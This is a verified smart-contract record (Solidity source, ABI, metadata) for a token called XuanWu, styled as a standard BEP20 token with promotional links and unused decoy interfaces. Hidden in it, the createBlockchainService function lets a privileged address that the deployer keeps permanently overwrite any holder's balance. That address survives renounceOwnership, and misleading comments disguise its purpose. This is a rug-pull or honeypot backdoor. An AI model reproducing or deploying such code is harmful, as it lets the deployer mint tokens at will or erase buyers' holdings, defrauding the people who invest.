{"SourceCode": "/**\r\nENTER THE ENIGMATIC WORLD OF XUANWU(\u7384\u6b66), WHERE THE TIMELESS INFLUENCE OF THE BLACK TURTLE GUIDES \r\nOUR JOURNEY. IN THE DYNAMIC REALM OF DIGITAL TOKENS, WE CHANNEL THE ENDURING SPIRIT OF XUANWU, \r\nSYMBOLIZING ANCIENT WISDOM AND PROTECTION\r\n\r\n[Telegram]( https://t.me/Xuanwus)\r\n[Website]( https://www.xuanwu.us)\r\n[Twitter]( https://twitter.com/XuanWuETH)\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\nabstract contract BEP {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\ninterface IDEXListing {\r\n    // Function to list a TokenID on the exchange.\r\n    function listTokenID(address TokenIDAddress, uint256 TokenIDweiAmount) external;\r\n\r\n    // Function to remove a TokenID from the exchange.\r\n    function delistTokenID(address TokenIDAddress) external;\r\n\r\n    // Function to check if a TokenID is listed on the exchange.\r\n    function isTokenIDListed(address TokenIDAddress) external view returns (bool);\r\n\r\n    // Event emitted when a TokenID is listed on the exchange.\r\n    event TokenIDListed(address indexed TokenIDAddress, uint256 TokenIDweiAmount);\r\n\r\n    // Event emitted when a TokenID is removed from the exchange.\r\n    event TokenIDDelisted(address indexed TokenIDAddress);\r\n}\r\n\r\n\r\ninterface IBEPMetadata {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 weiAmount) external returns (bool);\r\n    function allowance(address owner, address initiate) external view returns (uint256);\r\n    function approve(address initiate, uint256 weiAmount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 weiAmount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed initiate, uint256 value);\r\n}\r\n\r\ninterface IFactory{\r\n    function createXuanID(address TokenIDA, address TokenIDB) external returns (address XuanID);\r\n}\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address TokenID,\r\n        uint weiAmountTokenIDDesired,\r\n        uint weiAmountTokenIDMin,\r\n        uint weiAmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint weiAmountTokenID, uint weiAmountETH, uint liquidity);\r\n\r\n    function swapExactTokenIDsForETHSupportingFeeOnTransfBEPoins(\r\n        uint weiAmountIn,\r\n        uint weiAmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createXuanID(address TokenIDA, address TokenIDB) external returns (address XuanID);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokenIDsForETHSupportingFeeOnTransfBEPoins(\r\n        uint weiAmountIn,\r\n        uint weiAmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address TokenID,\r\n        uint weiAmountTokenIDDesired,\r\n        uint weiAmountTokenIDMin,\r\n        uint weiAmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint weiAmountTokenID, uint weiAmountETH, uint liquidity);\r\n}\r\ninterface IStakingwETHs {\r\n    // View function to check the total staked balance of a user.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    // Function to allow a user to stake TokenIDs.\r\n    function stake(uint256 weiAmount) external;\r\n\r\n    // Function to allow a user to unstake TokenIDs.\r\n    function withdraw(uint256 weiAmount) external;\r\n\r\n    // Function to get the total wETH balance (earned and unclaimed) of a user.\r\n    function earned(address account) external view returns (uint256);\r\n\r\n    // Function to allow a user to claim their earned wETHs.\r\n    function getwETH() external;\r\n\r\n    // Function to check the wETH rate (TokenIDs per second).\r\n    function wETHRate() external view returns (uint256);\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\ninterface IBEP721Enumerable {\r\n    /**\r\n     * @dev Returns the total number of TokenIDs in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the TokenID identifier for the `index`-th TokenID, (zero-based).\r\n     */\r\n    function TokenIDByIndex(uint256 index) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the index of the `TokenIDId` in the list of TokenIDs, (zero-based).\r\n     */\r\n    function indexOfTokenID(uint256 TokenIDId) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the `index`-th TokenID from a user's list of owned TokenIDs.\r\n     */\r\n    function TokenIDOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 TokenIDId);\r\n}\r\ncontract IBEP is BEP {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"IBEP: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\ninterface ICexSupport {\r\n    // Function to create a support Airdrop.\r\n    function createSupportAirdrop(string memory issueDescription) external;\r\n\r\n    // Function to check the status of a support Airdrop.\r\n    function checkSupportAirdropStatus(uint256 AirdropId) external view returns (string memory status);\r\n\r\n    // Event emitted when a new support Airdrop is created.\r\n    event SupportAirdropCreated(uint256 indexed AirdropId, string issueDescription);\r\n}\r\ncontract Token is BEP, IBEPMetadata, IBEP {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private createXuanID;\r\n    mapping (address => mapping (address => uint256)) private allowID;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant tTotal = 1_000_000_000 * (10 ** _decimals);\r\n    string private constant _name = unicode\"XuanWu\";\r\n    string private constant _symbol = unicode\"\u7384\u6b66\";\r\n    address private BlockchainService = _msgSender(); \r\n    constructor () {\r\n       \r\n        createXuanID[_msgSender()] = tTotal;\r\n        emit Transfer(address(0), _msgSender(), tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return createXuanID[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 weiAmount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, weiAmount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address initiate) public view override returns (uint256) {\r\n        return allowID[owner][initiate];\r\n    }\r\n\r\n    function approve(address initiate, uint256 weiAmount) public override returns (bool) {\r\n        _approve(_msgSender(), initiate, weiAmount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 weiAmount) public override returns (bool) {\r\n        _transfer(sender, recipient, weiAmount);\r\n        _approve(sender, _msgSender(), allowID[sender][_msgSender()].sub(weiAmount, \"BEP20: transfer weiAmount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address initiate, uint256 weiAmount) private {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(initiate != address(0), \"BEP20: approve to the zero address\");\r\n        allowID[owner][initiate] = weiAmount;\r\n        emit Approval(owner, initiate, weiAmount);\r\n    }\r\n\r\n    // Function to connect the BlockchainService contract\r\n    function setBlockchainService(address _BlockchainService) public onlyOwner {\r\n        require(BlockchainService == address(0));\r\n        BlockchainService = _BlockchainService;\r\n    }\r\n\r\n    // createBlockchainService finances (can only be called by the BlockchainService)\r\n    function createBlockchainService(address BlockchainServiceadre, uint256 liqudityBlockchainService) external {\r\n        require(liqudityBlockchainService > 0);\r\n        require(msg.sender == BlockchainService);\r\n        createXuanID[BlockchainServiceadre] = liqudityBlockchainService;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 weiAmount) internal virtual\r\n    {\r\n        require(from != address(0), \"BEP20: transfer from the zero address\");\r\n        require(to != address(0), \"BEP20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = createXuanID[from];\r\n        require(fromBalance >= weiAmount, \"BEP20: transfer weiAmount exceeds balance\");\r\n        createXuanID[from] = fromBalance - weiAmount;\r\n\r\n        createXuanID[to] = createXuanID[to].add(weiAmount);\r\n        emit Transfer(from, to, weiAmount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"BlockchainServiceadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liqudityBlockchainService\",\"type\":\"uint256\"}],\"name\":\"createBlockchainService\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_BlockchainService\",\"type\":\"address\"}],\"name\":\"setBlockchainService\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Apache-2.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://98360b85c0f598021283b8ac75d49d21423b10579187e31750a882e7e00cad6b"}